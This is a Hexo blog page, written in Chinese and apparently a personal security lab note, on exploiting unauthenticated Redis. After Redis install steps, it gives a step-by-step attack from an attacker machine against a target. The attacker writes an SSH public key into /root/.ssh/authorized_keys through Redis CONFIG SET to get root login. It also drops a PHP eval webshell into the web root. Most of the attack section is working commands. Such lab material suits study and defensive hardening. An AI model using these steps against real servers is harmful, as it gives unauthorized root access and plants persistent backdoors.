@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="zh_CN">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="redis未授权访问"/><link rel="alternate" href="/atom.xml" title="Saltneko"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="http://yoursite.com/2021/03/29/redis未授权访问/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":"app_id:sB2SP6AaImiT4x3A8ms2stxj-gzGzoHsz app_key:69kbIXu3HeNAasY9m6mbX6fa","toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>redis未授权访问 - Saltneko</title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Saltneko</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/archives/">
+        <li class="mobile-menu-item">Archives
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories
+          </li>
+      </a><a href="/link/">
+        <li class="mobile-menu-item">Link
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Saltneko</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            Archives
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            Categories
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/link/">
+            Link
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">redis未授权访问
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2021-03-29
+        </span><span class="post-category">
+            <a href="/categories/Redis/">Redis</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis的安装"><span class="toc-text">#redis的安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#验证未授权访问"><span class="toc-text">#验证未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#写入ssh公钥，获取操作系统权限"><span class="toc-text">#写入ssh公钥，获取操作系统权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#写入webshell"><span class="toc-text">#写入webshell</span></a></li></ol></li></ol>
+    </div>
+  </div><div class="post-content"><h3 id="redis的安装"><a href="#redis的安装" class="headerlink" title="#redis的安装"></a>#redis的安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.11.tar.gz &#x2F;&#x2F;下载redis</span><br><span class="line">tar zxvf redis-3.2.11.tar.gz &#x2F;&#x2F;解压</span><br><span class="line">cd redis-3.2.11</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">cp redis.conf &#x2F;etc&#x2F;</span><br><span class="line">cd &#x2F;src&#x2F;</span><br><span class="line">cp redis-server &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">cp redis-cli &#x2F;use&#x2F;bin&#x2F;</span><br><span class="line">cd ..&#x2F;</span><br><span class="line">vim &#x2F;etc&#x2F;redis.conf</span><br><span class="line">redis-server &#x2F;etc&#x2F;redis.conf</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-272.png" alt="upload successful"><br><img src="/images/pasted-273.png" alt="upload successful"><br>*报错1：gcc：命令未找到<br>yum install gcc-c++<br>*报错2：You need tcl 8.5 or newer in order to run the Redis test<br>wget <a href="http://downloads.sourceforge.net/tcl/tcl8.6.1-src.tar.gz" target="_blank" rel="noopener">http://downloads.sourceforge.net/tcl/tcl8.6.1-src.tar.gz</a><br>sudo tar xzvf tcl8.6.1-src.tar.gz -C /usr/local/<br>cd /usr/local/tcl8.6.1/unix/<br>sudo ./configure<br>sudo make<br>sudo make install<br>*报错3：致命错误：jemalloc/jemalloc.h：没有那个文件或目录<br>make MALLOC=libc</p>
+<h3 id="验证未授权访问"><a href="#验证未授权访问" class="headerlink" title="#验证未授权访问"></a>#验证未授权访问</h3><h4 id="写入ssh公钥，获取操作系统权限"><a href="#写入ssh公钥，获取操作系统权限" class="headerlink" title="#写入ssh公钥，获取操作系统权限"></a>#写入ssh公钥，获取操作系统权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ifconfig</span><br><span class="line">cd redis-3.2.11</span><br><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">cd redis-3.2.11</span><br><span class="line">redis-cli -h 靶机地址</span><br><span class="line">keys * &#x2F;&#x2F;返回（empty list or set)</span><br><span class="line">exit</span><br><span class="line">ssh root@靶机地址 &#x2F;&#x2F;提示需要密码</span><br><span class="line">Ctrl+C 退出</span><br><span class="line">ssh-keygen -t rsa &#x2F;&#x2F;生成ssh公钥</span><br><span class="line">cd &#x2F;root&#x2F;.ssh</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;)&gt;key.txt &#x2F;&#x2F;公钥写入key.txt文件</span><br><span class="line">cp key.txt &#x2F;redis-3.2.11&#x2F;</span><br><span class="line">cd &#x2F;redis-3.2.11&#x2F;</span><br><span class="line">cat key.txt|redis-cli -h 靶机地址 -x set crack &#x2F;&#x2F;写入文件</span><br><span class="line">redis-cli -h 靶机地址 &#x2F;&#x2F;远程登陆靶机redis服务</span><br><span class="line">get crack</span><br><span class="line">config get dir</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh &#x2F;&#x2F;切换redis数据文件保存目录为.ssh</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot; &#x2F;&#x2F;设置上传公钥的备份文件名字为authorized_keys</span><br><span class="line">save</span><br><span class="line">exit</span><br><span class="line">ssh root@靶机地址</span><br><span class="line">成功登陆</span><br></pre></td></tr></table></figure>
+<p>*报错1：No route to host<br>靶机设置：<br>firewall-cmd –query-port=6379/tcp //查看6379端口是否对外开放<br>firewall-cmd –add-port=6379/tcp –permanent //开放6379端口<br>systemctl status firewalld //重启防火墙<br>firewall-cmd –list-ports //查看开放端口</p>
+<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="#写入webshell"></a>#写入webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">yum update httpd</span><br><span class="line">yum install httpd</span><br><span class="line">systemctl start httpd</span><br><span class="line">firewall-cmd --add-port&#x3D;80&#x2F;tcp --permanent &#x2F;&#x2F;开放80端口</span><br><span class="line">systemctl status firewalld &#x2F;&#x2F;重启防火墙</span><br><span class="line">浏览器访问对应靶机地址，显示该界面</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-271.png" alt="upload successful"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">redis-cli -h 靶机地址</span><br><span class="line">config set dir &#x2F;vat&#x2F;www&#x2F;html</span><br><span class="line">set xxx &quot;\n\n&lt;?php @eval($_POST[&#39;salt&#39;]);?&gt;\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line">save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+      </div>
+      
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="next" href="/2021/03/29/kali%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4/">
+        <span class="next-text nav-default">kali常见指令</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div>
+  <div class="comments" id="comments">
+    
+  </div>
+</div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:1281714262@qq.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/SaLTNEko" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Salt</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
